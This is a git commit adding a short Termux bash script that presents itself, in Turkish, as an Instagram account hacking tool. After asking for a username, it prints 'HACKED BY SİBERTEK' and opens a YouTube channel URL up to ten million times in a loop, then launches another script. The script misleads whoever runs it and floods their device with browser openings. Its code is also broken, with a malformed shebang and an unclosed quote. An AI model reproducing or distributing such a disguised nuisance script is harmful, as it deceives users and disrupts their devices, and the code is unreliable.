d81e84fb7b340aca85c58b8d40af8e3a655ade2f
sibertek-hd <63284238+sibertek-hd@users.noreply.github.com>
2020-04-14 10:11:09 +0300

    st.sh

---
+++ st.sh
@@ -0,0 +1,29 @@
+!/bin/bash
+echo -e '\e[1;33m
+
+
+      _           _           _
+     /\  \         /\  \         /\  \
+     \:\  \       /::\  \        \:\  \
+      \:\  \     /:/\ \  \        \:\  \
+      /::\  \   _\:\~\ \  \       /::\  \
+     /:/\:\_\ /\ \:\ \ \\     /:/\:\_\
+    /:/  \/_/ \:\ \:\ \//    /:/  \/_/
+   /:/  /       \:\ \:\__\     /:/  /
+   \/_/         \:\/:/  /     \/_/
+                  \::/  /
+                   \/__/
+
+.   ,
+ \./  .. _  ..
+  |  (][ | )(][ )'
+
+echo 'İnstagram Kullanıcı Adı:'
+read
+max=10000000
+for (( i=2; i <= $max; i++))
+do
+echo -e "\e[92m\e[5m HACKED BY SİBERTEK"
+termux-open-url https://www.youtube.com/channel/UCnA-J-CqRpAUshewtsZQuCg
+done
+bash instagram_hack.sh
